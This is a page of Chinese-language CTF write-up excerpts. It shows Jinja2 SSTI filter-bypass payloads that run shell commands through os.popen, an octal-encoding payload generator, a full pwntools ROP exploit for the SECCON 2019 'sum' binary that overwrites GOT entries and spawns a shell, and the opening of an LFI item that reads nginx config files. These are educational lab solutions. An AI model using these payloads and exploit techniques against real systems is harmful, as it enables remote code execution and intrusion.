		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/3745">题目链接</a>  </p>
<p><code>&#123;&#123;&#125;&#125;, .</code>被过滤  payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">name=&#123;% <span class="built_in">set</span> po=<span class="built_in">dict</span>(po=a,p=b)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> a=(()|select|string|<span class="built_in">list</span>)|attr(po)(<span class="number">24</span>)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> ini=(a,a,<span class="built_in">dict</span>(<span class="keyword">in</span>=a,it=b)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> glo=(a,a,<span class="built_in">dict</span>(glo=a,bals=b)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> cls=(a,a,<span class="built_in">dict</span>(cla=a,ss=b)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> bs=(a,a,<span class="built_in">dict</span>(bas=a,e=b)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> geti=(a,a,<span class="built_in">dict</span>(get=a)|join,<span class="built_in">dict</span>(item=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> subc=(a,a,<span class="built_in">dict</span>(subcla=a,sses=b)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> pp=<span class="built_in">dict</span>(pop=a,en=b)|join %&#125;</span><br><span class="line">&#123;%<span class="built_in">print</span>(()|attr(cls)|attr(bs)|attr(subc)()|attr(geti)(<span class="number">132</span>)|attr(ini)|attr(glo)|attr(geti)(pp)(‘tac /flag’)|attr(‘read’)() )%&#125;</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">set</span> u=<span class="string">&#x27;%c&#x27;</span>%<span class="number">95</span>*<span class="number">2</span>%&#125;&#123;%<span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>|attr(u+<span class="string">&#x27;cla&#x27;</span><span class="string">&#x27;ss&#x27;</span>+u)|attr(u+<span class="string">&#x27;ba&#x27;</span><span class="string">&#x27;se&#x27;</span>+u)|attr(u+<span class="string">&#x27;su&#x27;</span><span class="string">&#x27;bcla&#x27;</span><span class="string">&#x27;sses&#x27;</span>+u)()|attr(<span class="number">213</span>)|attr(u+<span class="string">&#x27;i&#x27;</span><span class="string">&#x27;n&#x27;</span><span class="string">&#x27;i&#x27;</span><span class="string">&#x27;t&#x27;</span>+u)|attr(u+<span class="string">&#x27;glo&#x27;</span><span class="string">&#x27;bal&#x27;</span><span class="string">&#x27;s&#x27;</span>+u)|attr(<span class="string">&#x27;ge&#x27;</span><span class="string">&#x27;t&#x27;</span>)(u+<span class="string">&#x27;bui&#x27;</span><span class="string">&#x27;lti&#x27;</span><span class="string">&#x27;ns&#x27;</span>+u)|attr(<span class="string">&#x27;ge&#x27;</span><span class="string">&#x27;t&#x27;</span>)(u+<span class="string">&#x27;imp&#x27;</span><span class="string">&#x27;ort&#x27;</span>+u)(<span class="string">&#x27;o&#x27;</span><span class="string">&#x27;s&#x27;</span>)|attr(<span class="string">&#x27;po&#x27;</span><span class="string">&#x27;pen&#x27;</span>)(<span class="string">&#x27;ca&#x27;</span><span class="string">&#x27;t /f&#x27;</span><span class="string">&#x27;lag&#x27;</span>)|attr(<span class="string">&#x27;re&#x27;</span><span class="string">&#x27;ad&#x27;</span>)())%&#125;</span><br></pre></td></tr></table></figure>

<p>或者直接用fenjing <a target="_blank" rel="noopener" href="https://github.com/Marven11/Fenjing">https://github.com/Marven11/Fenjing</a></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ pip3 install fenjing</span><br><span class="line">$ python3 -m fenjing crack -u <span class="string">&quot;http://node5.anna.nssctf.cn:28879/get_flag&quot;</span> -i <span class="string">&quot;name&quot;</span></span><br></pre></td></tr></table></figure>


	
	</div>
  <a type="button" href="/2023/10/17/GDOUCTF2023-ezze-wp/#more" class="btn btn-default more">Read More</a>
</div>

		
			
					
						<!-- display as entry -->
						<div class="row">
							<div class="col-md-8">
								<h3 class="title">
									<a href="/2023/10/16/axb2020-NormalSSTI-wp/" >安洵杯2020 Normal SSTI-wp</a>
								</h3>
							</div>
							<div class="col-md-4">
								<div class="date">post @ 2023-10-16
								</div>
							</div>
						</div>
						
								
			<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/910">题目链接</a>  </p>
<p>提示传递<code>/test?url=</code></p>
<p>尝试发现<code>&#123;&#123;&#125;&#125;, [], ., _,&#39;&#39;</code>等都被禁用</p>
<p>那么可以通过<code>|attr()</code>加上编码（我这里用的八进制，也可以十六进制或unicode）来构造</p>
<p>构造脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str2oct</span>(<span class="params">s</span>):</span><br><span class="line">    res = [<span class="built_in">oct</span>(<span class="built_in">ord</span>(i)) <span class="keyword">for</span> i <span class="keyword">in</span> s]</span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span>.join(res).replace(<span class="string">&quot;0o&quot;</span>, <span class="string">&quot;\\&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str2attr</span>(<span class="params">t</span>):</span><br><span class="line">    t = re.sub(<span class="string">r&#x27;[[][\&#x27;&quot;](.*?)[\&#x27;&quot;][]]&#x27;</span>, <span class="string">r&#x27;.get(&quot;\1&quot;)&#x27;</span>, t)</span><br><span class="line">    t = re.sub(<span class="string">r&#x27;[[](\d+)[]]&#x27;</span>, <span class="string">r&#x27;.__getitem__(\1)&#x27;</span>, t)</span><br><span class="line">    tt = t.split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">    tt.pop(<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">print</span>(tt)</span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tt:</span><br><span class="line">        idx = i.find(<span class="string">&#x27;(&#x27;</span>)</span><br><span class="line">        idx2 = i.find(<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> idx == -<span class="number">1</span>:</span><br><span class="line">            idx = <span class="built_in">len</span>(i)</span><br><span class="line">            idx2 = idx</span><br><span class="line"></span><br><span class="line">        tmp = i[idx:idx2+<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;(&#x27;</span> <span class="keyword">in</span> tmp <span class="keyword">and</span> (<span class="string">&#x27;&quot;&#x27;</span> <span class="keyword">in</span> tmp <span class="keyword">or</span> <span class="string">&quot;&#x27;&quot;</span> <span class="keyword">in</span> tmp):</span><br><span class="line">            tmp = tmp.strip(<span class="string">&#x27;(&#x27;</span>).strip(<span class="string">&#x27;)&#x27;</span>).strip(<span class="string">&#x27;&quot;&#x27;</span>).strip(<span class="string">&quot;&#x27;&quot;</span>)</span><br><span class="line">            tmp = <span class="string">f&#x27;(&quot;<span class="subst">&#123;str2oct(tmp)&#125;</span>&quot;)&#x27;</span></span><br><span class="line">        res += <span class="string">f&#x27;|attr(&quot;<span class="subst">&#123;str2oct(i[:idx])&#125;</span>&quot;)<span class="subst">&#123;tmp&#125;</span>&#x27;</span></span><br><span class="line">        tmp = i[idx2+<span class="number">1</span>:]</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;(&#x27;</span> <span class="keyword">in</span> tmp <span class="keyword">and</span> (<span class="string">&#x27;&quot;&#x27;</span> <span class="keyword">in</span> tmp <span class="keyword">or</span> <span class="string">&quot;&#x27;&quot;</span> <span class="keyword">in</span> tmp):</span><br><span class="line">            tmp = tmp.strip(<span class="string">&#x27;(&#x27;</span>).strip(<span class="string">&#x27;)&#x27;</span>).strip(<span class="string">&#x27;&quot;&#x27;</span>).strip(<span class="string">&quot;&#x27;&quot;</span>)</span><br><span class="line">            tmp = <span class="string">f&#x27;(&quot;<span class="subst">&#123;str2oct(tmp)&#125;</span>&quot;)&#x27;</span></span><br><span class="line">            res += tmp</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line">txt = <span class="string">&#x27;.__class__.__base__.__subclasses__()[100].__init__.__globals__[&quot;__builtins__&quot;][&quot;__import__&quot;](&quot;os&quot;).popen(&quot;ls&quot;).read()&#x27;</span></span><br><span class="line">str2attr(txt)</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/test?url=&#123;%<span class="keyword">print</span>(<span class="string">&quot;a&quot;</span>|<span class="title function_ invoke__">attr</span>(<span class="string">&quot;\137\137\143\154\141\163\163\137\137&quot;</span>)|<span class="title function_ invoke__">attr</span>(<span class="string">&quot;\137\137\142\141\163\145\137\137&quot;</span>)|<span class="title function_ invoke__">attr</span>(<span class="string">&quot;\137\137\163\165\142\143\154\141\163\163\145\163\137\137&quot;</span>)()|<span class="title function_ invoke__">attr</span>(<span class="string">&quot;\137\137\147\145\164\151\164\145\155\137\137&quot;</span>)(<span class="number">100</span>)|<span class="title function_ invoke__">attr</span>(<span class="string">&quot;\137\137\151\156\151\164\137\137&quot;</span>)|<span class="title function_ invoke__">attr</span>(<span class="string">&quot;\137\137\147\154\157\142\141\154\163\137\137&quot;</span>)|<span class="title function_ invoke__">attr</span>(<span class="string">&quot;\147\145\164&quot;</span>)(<span class="string">&quot;\137\137\142\165\151\154\164\151\156\163\137\137&quot;</span>)|<span class="title function_ invoke__">attr</span>(<span class="string">&quot;\147\145\164&quot;</span>)(<span class="string">&quot;\137\137\151\155\160\157\162\164\137\137&quot;</span>)(<span class="string">&quot;\157\163&quot;</span>)|<span class="title function_ invoke__">attr</span>(<span class="string">&quot;\160\157\160\145\156&quot;</span>)(<span class="string">&quot;ls&quot;</span>)|<span class="title function_ invoke__">attr</span>(<span class="string">&quot;\162\145\141\144&quot;</span>)())%&#125;</span><br></pre></td></tr></table></figure>

<p>或者也可以直接用flask中的 lipsum方法,可以用于得到__builtins__，而且lipsum.__globals__含有os模块</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">txt = <span class="string">&#x27;.__globals__.get(&quot;os&quot;).popen(&quot;ls&quot;).read()&#x27;</span></span><br><span class="line">str2attr(txt)</span><br><span class="line"><span class="comment"># lipsum|attr(&quot;\137\137\147\154\157\142\141\154\163\137\137&quot;)|attr(&quot;\147\145\164&quot;)(&quot;\157\163&quot;)|attr(&quot;\160\157\160\145\156&quot;)(&quot;\154\163&quot;)|attr(&quot;\162\145\141\144&quot;)()</span></span><br></pre></td></tr></table></figure>

	
	</div>
  <a type="button" href="/2023/10/16/axb2020-NormalSSTI-wp/#more" class="btn btn-default more">Read More</a>
</div>

		
			
					
						<!-- display as entry -->
						<div class="row">
							<div class="col-md-8">
								<h3 class="title">
									<a href="/2023/10/14/seccon2019-sum-wp/" >nightmare 7.2.3.seccon2019-sum-wp</a>
								</h3>
							</div>
							<div class="col-md-4">
								<div class="date">post @ 2023-10-14
								</div>
							</div>
						</div>
						
								
			<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="https://github.com/guyinatuxedo/nightmare/tree/master/modules/17-stack_pivot/seccon19_sum">相关资源</a>  </p>
<h2 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ checksec sum</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x3fe000)</span><br></pre></td></tr></table></figure>

<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>main</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span> &#123;</span><br><span class="line">  __int64 v4[<span class="number">5</span>]; <span class="comment">// [rsp+0h] [rbp-40h] BYREF</span></span><br><span class="line">  __int64 *v5; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+30h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="keyword">sizeof</span>(v4));</span><br><span class="line">  v6 = <span class="number">0LL</span>;</span><br><span class="line">  v5 = &amp;v6;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[sum system]\nInput numbers except for 0.\n0 is interpreted as the end of sequence.\n&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[Example]\n2 3 4 0&quot;</span>);</span><br><span class="line">  read_ints(v4, <span class="number">5LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)sum(v4, v5) &gt; <span class="number">5</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%llu\n&quot;</span>, v6);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>read_ints   结合main中<code>13# read_ints(v4, 5LL);</code>可以看到实际上读入了6个八字  覆盖了main中的<code>v5</code>指针</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">read_ints</span><span class="params">(__int64 *a1, __int64 a2)</span> &#123;</span><br><span class="line">  __int64 i; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i &lt;= a2; ++i ) &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)__isoc99_scanf(<span class="string">&quot;%lld&quot;</span>, &amp;a1[i]) != <span class="number">1</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !a1[i] )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>sum   结合main中<code>14# sum(v4, v5)</code>可以看到 是将数组中的数求和，存到v5指向的内存空间   返回相加的数字的个数</p>
<p>main中 如果相加的个数大于5  则exit  否则调用printf</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sum</span><span class="params">(__int64 *a1, _QWORD *a2)</span> &#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  *a2 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; a1[i]; ++i ) &#123;</span><br><span class="line">    v2 = i;</span><br><span class="line">    *a2 += a1[v2];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h2><p>明显可以通过写入6个数 来实现任意地址写（第6个为目标地址，6个求和为目标值）   但只能写一次，如何实现多次写入呢？  </p>
<p>因为相加个数为6个  所以会exit   可以将<code>main</code>写入<code>exit@got</code> 这样就可以多次写入了</p>
<p>紧接着又有问题  没有可以直接泄露libc基址或stack地址的地方  怎么获取shell呢？</p>
<p>最开始想到的是 直接partial_overwrite <code>printf@got</code>中的低字节  使其成为one_gadget的地址   但是仍然有12bit的随机性  概率比较低</p>
<p>观察到执行到<code>call printf</code>时  栈顶的内容就是我们输入的数字  因此可控   那么可以在改写<code>printf@got</code>为<code>pop xxx; ret</code>（因为call会push进一个地址）然后接着使用ROP  输出puts真实地址  获取libc基址  然后再一次就是system的ROP了</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">pty = process.PTY</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">mode = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    mode = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">proc = process(<span class="string">&quot;./sum&quot;</span>, env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;./libc.so&quot;</span>&#125;)</span><br><span class="line">belf = ELF(<span class="string">&quot;./sum&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">x</span>): proc.send(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.sendline(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">x, y</span>): <span class="keyword">return</span> proc.sendlineafter(x, y)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">x, y</span>): <span class="keyword">return</span> proc.sendafter(x, y)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.recvuntil(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc</span>(): <span class="keyword">return</span> proc.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(): <span class="keyword">return</span> proc.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">li</span>(<span class="params">con</span>): <span class="keyword">return</span> log.info(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ls</span>(<span class="params">con</span>): <span class="keyword">return</span> log.success(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pi</span>(): <span class="keyword">return</span> proc.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pcls</span>(): <span class="keyword">return</span> proc.close()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ga</span>(): <span class="keyword">return</span> u64(ru(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">addr, con</span>):</span><br><span class="line">    payload = <span class="string">f&#x27;<span class="subst">&#123;con-<span class="number">4</span>-addr&#125;</span> <span class="subst">&#123;<span class="number">1</span>&#125;</span> <span class="subst">&#123;<span class="number">1</span>&#125;</span> <span class="subst">&#123;<span class="number">1</span>&#125;</span> <span class="subst">&#123;<span class="number">1</span>&#125;</span> <span class="subst">&#123;addr&#125;</span>&#x27;</span>.encode()</span><br><span class="line">    sla(<span class="string">b&#x27;0&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">gscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    b * 0x0000000000400987</span></span><br><span class="line"><span class="string">    b * 0x00000000004009BF</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span> + <span class="string">&#x27;c\n&#x27;</span> * <span class="number">4</span></span><br><span class="line"><span class="keyword">if</span> mode == <span class="string">&#x27;-d&#x27;</span>:</span><br><span class="line">    gdb.attach(proc, gdbscript=gscript)</span><br><span class="line"></span><br><span class="line">main = belf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">exit_got = belf.got[<span class="string">&#x27;exit&#x27;</span>]</span><br><span class="line">printf_got = belf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">puts_got = belf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">rdi_ret = <span class="number">0x0000000000400a43</span></span><br><span class="line">ret = <span class="number">0x00000000004005ee</span></span><br><span class="line">puts_plt = belf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">write(exit_got, main)</span><br><span class="line">write(printf_got, rdi_ret)</span><br><span class="line">payload = <span class="string">f&#x27;<span class="subst">&#123;rdi_ret&#125;</span> <span class="subst">&#123;puts_got&#125;</span> <span class="subst">&#123;puts_plt&#125;</span> <span class="subst">&#123;<span class="built_in">str</span>(<span class="number">0x4009a7</span>)&#125;</span> 0&#x27;</span>.encode()	<span class="comment"># 这里注意0x4009a7是call exit的指令地址  不直接用main或exit是因为会导致栈不对齐而crash</span></span><br><span class="line">sla(<span class="string">b&#x27;0&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">libc_base = ga() - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">ls(<span class="string">&quot;libc base: &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">binsh_str = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">f&#x27;<span class="subst">&#123;rdi_ret&#125;</span> <span class="subst">&#123;binsh_str&#125;</span> <span class="subst">&#123;system&#125;</span> <span class="subst">&#123;<span class="built_in">str</span>(<span class="number">0x4009a7</span>)&#125;</span> 0&#x27;</span>.encode()</span><br><span class="line">sla(<span class="string">b&#x27;0&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">pi()</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure>



	
	</div>
  <a type="button" href="/2023/10/14/seccon2019-sum-wp/#more" class="btn btn-default more">Read More</a>
</div>

		
			
					
						<!-- display as entry -->
						<div class="row">
							<div class="col-md-8">
								<h3 class="title">
									<a href="/2023/10/13/HNCTF2022-easyInclude-wp/" >HNCTF2022-easy_include-wp</a>
								</h3>
							</div>
							<div class="col-md-4">
								<div class="date">post @ 2023-10-13
								</div>
							</div>
						</div>
						
								
			<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2948">题目链接</a>   </p>
<h2 id="日志注入getshell"><a href="#日志注入getshell" class="headerlink" title="日志注入getshell"></a>日志注入getshell</h2><blockquote>
<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/my1e3/p/5854897.html">https://www.cnblogs.com/my1e3/p/5854897.html</a></p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//WEB手要懂得搜索</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|flag|data|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=/i&quot;</span>, <span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>明显禁用了php:&#x2F;&#x2F;和data:&#x2F;&#x2F;伪协议   那么可以用file:&#x2F;&#x2F;来查看文件</p>
<p>由文件头可知是nginx服务器   nginx的配置文件为<code>/etc/nginx/nginx.conf</code>  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?file=/etc/nginx/nginx.conf</span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line"><span class="comment"># error_log  /var/log/nginx/error.log warn;</span></span><br><span class="line"><span class="comment"># ...</span></span><br></pre></td></tr></table></figure>

